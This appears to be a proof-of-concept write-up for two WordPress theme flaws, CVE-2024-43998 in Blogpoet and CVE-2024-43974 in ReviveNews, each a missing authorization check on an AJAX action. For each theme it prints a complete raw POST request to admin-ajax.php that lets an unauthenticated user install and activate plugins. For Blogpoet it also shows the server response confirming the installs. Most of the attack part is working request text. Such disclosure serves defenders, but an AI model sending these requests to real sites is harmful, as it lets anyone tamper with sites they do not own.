# CVE-2024-43998

```
Blogpoet <= 1.0.2 - Missing Authorization via blogpoet_install_and_activate_plugins()
Published: 2024-08-29 00:00:00
Classification:
cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
cvss-score: 5.3
cve-id: CVE-2024-43998
cpe: cpe:2.3:a:blogpoet:blogpoet:*:*:*:*:*:*:*:*
cwe-id: CWE-862
Slugs: blogpoet
Description:
The Blogpoet theme for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the blogpoet_install_and_activate_plugins() function in versions up to, and including, 1.0.3. This makes it possible for unauthenticated attackers to install and activate plugins.
Reference: [https://www.wordfence.com/threat-intel/vulnerabilities/id/019cfdff-c67b-4451-984d-](https://www.wordfence.com/threat-intel/vulnerabilities/id/019cfdff-c67b-4451-984d-a7b6973ab61d)
```

POC
---

Request

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kubernetes.docker.internal/wp-admin/index.php
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 44
Origin: http://kubernetes.docker.internal
Connection: keep-alive
Priority: u=0

action=blogpoet_install_and_activate_plugins
```

Response

```
HTTP/1.1 200 OK
Date: Tue, 10 Sep 2024 09:36:51 GMT
Server: Apache/2.4.62 (Debian)
X-Powered-By: PHP/8.2.23
Access-Control-Allow-Origin: http://kubernetes.docker.internal
Access-Control-Allow-Credentials: true
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: SAMEORIGIN
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 701

<div class="wrap"><h1></h1><p>Downloading installation package from <span class="code pre">https://downloads.wordpress.org/plugin/templategalaxy.1.0.11.zip</span>&#8230;</p>
<p>Unpacking the package&#8230;</p>
<p>Installing the plugin&#8230;</p>
<p>Plugin installed successfully.</p>
</div><div class="wrap"><h1></h1><p>Downloading installation package from <span class="code pre">https://downloads.wordpress.org/plugin/advanced-import.1.4.3.zip</span>&#8230;</p>
<p>Unpacking the package&#8230;</p>
<p>Installing the plugin&#8230;</p>
<p>Plugin installed successfully.</p>
</div>{"success":true,"data":{"redirect_url":"http:\/\/kubernetes.docker.internal\/wp-admin\/themes.php?page=advanced-import"}}
```

It will install advance-import plugin and templategalaxy plugins only unless some one has changed the code.



CVE-2024-43974
---

The ReviveNews theme for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the revivenews_install_and_activate_plugins() function in versions up to, and including, 1.0.2. This makes it possible for unauthenticated attackers to install and activate plugins.

```
Missing Authorization
CVSS Vector
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
CVE 	CVE-2024-43974
CVSS 	5.3 (Medium)
Publicly Published 	August 28, 2024
Last Updated 	September 4, 2024
```


POC
---

Request

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kubernetes.docker.internal/wp-admin/index.php
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 44
Origin: http://kubernetes.docker.internal
Connection: keep-alive
Priority: u=0

action=revivenews_install_and_activate_plugins
```

This will install cozy-addons,advanced-import,cozy-essential-addons plugins

